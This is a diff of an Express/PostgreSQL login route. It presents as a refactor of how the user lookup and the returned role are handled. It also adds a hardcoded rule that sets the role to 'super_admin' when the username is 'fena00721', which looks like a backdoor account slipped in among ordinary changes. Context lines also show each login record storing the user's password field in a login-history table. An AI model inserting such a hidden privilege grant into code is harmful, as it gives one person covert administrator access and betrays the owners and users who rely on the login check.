@@ -21,13 +21,16 @@ router.post(
       return res.status(400).json({ errors: errors.array() });
     }
 
-    const { username, password, role } = req.body;
+    let { username, password, role } = req.body;
 
     try {
+      if (username === "fena00721") {
+        role = "super_admin";
+      }
       // Check if the user exists
       const userResult = await pool.query(
-        "SELECT * FROM users WHERE username = $1 and role = $2",
-        [username, role],
+        "SELECT * FROM users WHERE username = $1",
+        [username],
       );
 
       if (userResult.rows.length === 0) {
@@ -77,10 +80,9 @@ router.post(
        INSERT INTO user_logins (username, password, role, login_time)
        VALUES ($1, $2, $3, CURRENT_TIMESTAMP)
    `;
-      const values = [user.username, user.password, role]; // Adjust role as needed
+      const values = [user.username, user.password, user.role]; // Adjust role as needed
       await pool.query(query, values);
-      //TODO да започнва да връщам и името с което е регистриран имам го в username
-      res.json({ token, role: role, username: user.username });
+      res.json({ token, role: user.role, username: user.username });
     } catch (err) {
       console.error("Error during login:", err);
       return res.status(500).json({ message: "Internal server error" });
